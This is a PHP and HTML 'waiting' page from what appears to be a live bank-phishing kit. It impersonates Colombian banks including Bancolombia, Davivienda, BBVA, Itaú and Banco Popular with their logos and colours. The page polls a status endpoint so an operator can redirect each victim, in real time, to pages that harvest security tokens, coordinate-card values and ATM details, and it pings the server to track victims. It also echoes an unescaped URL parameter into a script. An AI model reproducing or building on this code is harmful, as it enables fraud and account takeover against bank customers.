<?php
// esperando.php
session_start();

if (!isset($_GET["id"])) {
    die("ID de usuario no especificado");
}
$idUsuario = $_GET["id"];

try {
    $db = new PDO('sqlite:usuarios.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $db->prepare("SELECT identificador FROM usuarios WHERE id = ?");
    $stmt->execute([$idUsuario]);
    $usuario = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        die("Usuario no encontrado");
    }

    $identificador = $usuario["identificador"];

    $config = [
        'popular' => [
            'logo' => 'logo.svg',
            'color' => '#003366',
            'gif'   => 'ruedapopu.gif',
            'rutas' => [
                'token' => 'popular_token.php',
                'token1' => 'popular_token1.php',
                'coordenadas' => 'popular_coordenadas.php',
                'cajero' => 'actualizar.php',
                'final' => 'final.php',
                'error' => 'popu.php'
            ]
        ],
        'empresa' => [
            'logo' => 'logo.svg',
            'color' => '#880000',
            'gif'   => 'ruedapopu.gif',
            'rutas' => [
                'token' => 'popular1_token.php',
                'token1' => 'popular1_token1.php',
                'coordenadas' => 'popular1_coordenadas.php',
                'correo' => 'popular1_correo.php',
                'final' => 'final.php',
                'error' => 'popuempresa.php'
            ]
        ],
        'davivienda' => [
            'logo' => 'logo3.png',
            'color' => '#cc0000',
            'gif'   => 'rueda3.gif',
            'rutas' => [
                'token' => 'davi_token.php',
                'token1' => 'davi_token1.php',
                'coordenadas' => 'davi_coordenadas.php',
                'cajero' => 'davi_cajero.php',
                'final' => 'final.php',
                'error' => 'davi.php'
            ]
        ],
        'avvilla' => [
            'logo' => 'logo1.svg',
            'color' => '#003366',
            'gif'   => 'rueda1.gif',
            'rutas' => [
                'token' => 'villa_token.php',
                'token1' => 'villa_token1.php',
                'coordenadas' => 'coordenadas.php',
                'cajero' => 'villa_cajero.php',
                'final' => 'final.php',
                'error' => 'villa.php'
            ]
        ],
        'falabella' => [
            'logo' => 'https://www.bancofalabella.com.co/assets/logo.svg',
            'color' => '#009639',
            'gif'   => 'ruedapopu.gif',
            'rutas' => [
                'token' => 'fala_token.php',
                'token1' => 'fala_token1.php',
                'coordenadas' => 'fala_coordenadas.php',
                'cajero' => 'fala_cajero.php',
                'final' => 'final.php',
                'error' => 'fala.php'
            ]
        ],
        'occidente' => [
            'logo' => 'logo5.png',
            'color' => '#0033a0',
            'gif'   => 'rueda4.gif',
            'rutas' => [
                'token' => 'occi_token.php',
                'token1' => 'occi_token1.php',
                'coordenadas' => 'occi_coordenadas.php',
                'cajero' => 'occi_cajero.php',
                'final' => 'final.php',
                'error' => 'occi.php'
            ]
        ],
        'bancolombia' => [
            'logo' => 'logo7.png',
            'color' => '#f9b233',
            'gif'   => 'rueda7.gif',
            'rutas' => [
                'token' => 'banco_token.php',
                'token1' => 'banco_token1.php',
                'coordenadas' => 'banco_coordenadas.php',
                'cajero' => 'banco_cajero.php',
                'final' => 'final.php',
                'error' => 'bancol.php'
            ]
        ],
        'daviplata' => [
            'logo' => 'daviplata.svg',
            'color' => '#e60000',
            'gif'   => 'rueda_daviplata.gif',
            'rutas' => [
                'token' => 'dplata_token.php',
                'token1' => 'dplata_token1.php',
                'coordenadas' => 'dplata_coordenadas.php',
                'cajero' => 'dplata_cajero.php',
                'final' => 'final.php',
                'error' => 'plata.php'
            ]
        ],
        'bogota' => [
            'logo' => 'logo4.png',
            'color' => '#ffe600',
            'gif'   => 'rueda3.gif',
            'rutas' => [
                'token' => 'bog_token.php',
                'codigo' => 'bog_codigo.php',
                'codigoerror' => 'bog_codigoerror.php',
                'tokenerror' => 'bog_tokenerror.php',
                'coordenadas' => 'bog_coordenadas.php',
                'cajero' => 'actualizar.php',
                'final' => 'final.php',
                'error' => 'index1.php'
            ]
        ],
        'bbva' => [
            'logo' => 'logobbva.png',
            'color' => '#0033a0',
            'gif'   => 'rueda2.gif',
            'rutas' => [
                'token' => 'bbva_token.php',
                'token1' => 'bbva_token1.php',
                'coordenadas' => 'bbva_coordenadas.php',
                'cajero' => 'bbva_cajero.php',
                'final' => 'final.php',
                'error' => 'bbva.php'
            ]
        ],
        'cajasocial' => [
            'logo' => 'https://www.bancocajasocial.com/content/dam/bcs/logos/Logo-Banco-Caja-Social.png',
            'color' => '#0055a4',
            'gif'   => 'rueda2.gif',
            'rutas' => [
                'token' => 'caja_token.php',
                'token1' => 'caja_token1.php',
                'coordenadas' => 'caja_coordenadas.php',
                'cajero' => 'caja_cajero.php',
                'final' => 'final.php',
                'error' => 'caja.php'
            ]
        ],
        'colpatria' => [
            'logo' => 'logo6.png',
            'color' => '#d81e05',
            'gif'   => 'rueda6.gif',
            'rutas' => [
                'token' => 'colp_token.php',
                'token1' => 'colp_token1.php',
                'coordenadas' => 'colp_coordenadas.php',
                'cajero' => 'colp_cajero.php',
                'final' => 'final.php',
                'error' => 'colp.php'
            ]
        ],
        'lulobank' => [
            'logo' => 'lulo.svg',
            'color' => '#c10c86',
            'gif'   => 'rueda3.gif',
            'rutas' => [
                'token' => 'lulo_token.php',
                'token1' => 'lulo_token1.php',
                'coordenadas' => 'lulo_coordenadas.php',
                'cajero' => 'lulo_cajero.php',
                'final' => 'final.php',
                'error' => 'lulo.php'
            ]
        ],
        'itau' => [
            'logo' => 'data:image/png;base64,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',
            'color' => '#ff7900',
            'gif'   => 'rueda3.gif',
            'rutas' => [
                'token' => 'itau_token.php',
                'token1' => 'itau_token1.php',
                'coordenadas' => 'itau_coordenadas.php',
                'cajero' => 'itau_cajero.php',
                'final' => 'final.php',
                'error' => 'itau.php'
            ]
        ]
    ];

    $estilo = $config[$identificador] ?? $config['popular'];
    $rutas = $estilo['rutas'];

} catch (PDOException $e) {
    die("Error al conectar: " . $e->getMessage());
}
?>

<!-- Mantén tu PHP arriba tal cual está -->

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Esperando</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
       body {
        margin: 0;
        background-image: url('1.png');
        background-size: cover;         /* Escala la imagen para cubrir toda la pantalla */
        background-position: center;    /* Centra la imagen */
        background-repeat: no-repeat;   /* Evita que la imagen se repita */
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: white;
        font-family: Arial, sans-serif;
    }

        #logoParpadeante {
            max-width: 200px;
            display: none;
            transition: opacity 0.5s ease-in-out;
        }

        #logoParpadeante.show {
            display: block;
            opacity: 1;
        }

        #mensaje {
            margin-top: 20px;
            font-size: 20px;
        }
    </style>
</head>
<body>

    <!-- Logo parpadeante -->

<!-- Imagen estática de carga -->



<div class="mensaje">
   
</div>


    <script>
        const logo = document.getElementById('logoParpadeante');
        let visible = false;

        setInterval(() => {
            visible = !visible;
            logo.classList.toggle('show', visible);
            logo.style.display = visible ? 'block' : 'none';
        }, 1000);
    </script>

    <script>
        const idUsuario = "<?= $idUsuario ?>";
        const rutas = <?= json_encode($rutas) ?>;

        function checkStatus() {
            fetch("estado.php?id=" + idUsuario)
                .then(res => res.json())
                .then(data => {
                    if (data && data.estado && rutas[data.estado]) {
                        window.location.href = rutas[data.estado] + "?id=" + idUsuario;
                    } else {
                        setTimeout(checkStatus, 3000);
                    }
                })
                .catch(() => setTimeout(checkStatus, 3000));
        }

        checkStatus();

        function enviarPing() {
            fetch("status.php", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userId: idUsuario })
            });
        }

        setInterval(enviarPing, 3000);
        enviarPing();
    </script>

</body>
</html>
